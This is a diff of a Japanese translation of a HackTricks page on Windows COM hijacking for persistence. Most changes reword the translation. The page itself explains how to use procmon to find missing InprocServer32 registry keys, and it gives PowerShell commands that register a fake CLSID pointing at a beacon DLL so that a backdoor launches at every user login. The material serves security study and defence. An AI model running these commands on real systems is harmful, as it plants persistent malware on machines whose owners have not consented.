@@ -9,20 +9,20 @@ HackTricks をサポートする他の方法:
 * **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
 * [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
 * [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) コレクションを発見する
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で私をフォローする [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
-* **ハッキングテクニックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) をフォローする。
+* **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
 
 </details>
 
-### 存在しないCOMコンポーネントを検索する
+### 存在しないCOMコンポーネントの検索
 
-HKCUの値はユーザーによって変更される可能性があるため、**COM Hijacking** は **永続的なメカニズム** として使用できます。`procmon` を使用すると、存在しない検索されたCOMレジストリを見つけることが簡単になり、攻撃者が永続化することができます。フィルター:
+HKCUの値はユーザーによって変更される可能性があるため、**COM Hijacking** は **永続的なメカニズム** として使用できます。`procmon` を使用すると、存在しない検索されたCOMレジストリを見つけることが簡単で、攻撃者が永続化するために作成できるものです。フィルター:
 
 * **RegOpenKey** 操作。
 * _Result_ が **NAME NOT FOUND** である場所。
-* および _Path_ が **InprocServer32** で終わる。
+* および _Path_ が **InprocServer32** で終わる場合。
 
-存在しないCOMを偽装することを決定したら、次のコマンドを実行してください。_数秒ごとにロードされるCOMを偽装することを決定した場合は注意してください。_&#x20;
+存在しないCOMを偽装することを決定したら、次のコマンドを実行してください。_数秒ごとにロードされるCOMを偽装することを決定した場合は注意してください。_ &#x20;
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -84,4 +84,4 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-その後、HKCUエントリを作成するだけで、ユーザーがログインするたびにバックドアが起動します。
+その後、HKCUエントリを作成するだけで、ユーザーがログインするたびにあなたのバックドアが起動します。
